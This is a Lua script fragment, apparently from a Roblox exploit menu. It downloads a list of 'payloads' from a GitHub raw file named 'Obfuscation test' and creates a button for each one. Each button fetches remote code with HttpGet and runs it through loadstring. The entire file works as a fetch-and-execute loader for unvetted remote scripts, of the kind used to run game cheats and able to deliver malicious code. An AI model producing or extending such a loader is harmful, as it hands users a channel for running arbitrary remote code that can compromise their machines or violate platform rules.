-- Load payloads (AMAN: UI tetap muncul walau gagal)
local success, Payloads = pcall(function()
    return loadstring(game:HttpGet(
        "https://raw.githubusercontent.com/np00-bot/rawr/refs/heads/main/Obfuscation%20test"
    ))()
end)

if not success or type(Payloads) ~= "table" then
    warn("Failed to load Payloads:", Payloads)
    Payloads = {}
end

for _, data in ipairs(Payloads) do
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, -10, 0, 35)
    Btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    Btn.Text = tostring(data[1])
    Btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    Btn.TextSize = 12
    Btn.Font = Enum.Font.GothamSemibold
    Btn.Parent = ScrollFrame
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 6)

    Btn.MouseButton1Click:Connect(function()
        PlayClick()
        local url = data[2]

        task.spawn(function()
            local ok, err = pcall(function()
                local source = game:HttpGet(url)
                local func = loadstring(source)
                if func then
                    func()
                end
            end)
            if not ok then
                warn("Payload failed:", data[1], err)
            end
        end)
    end)
end

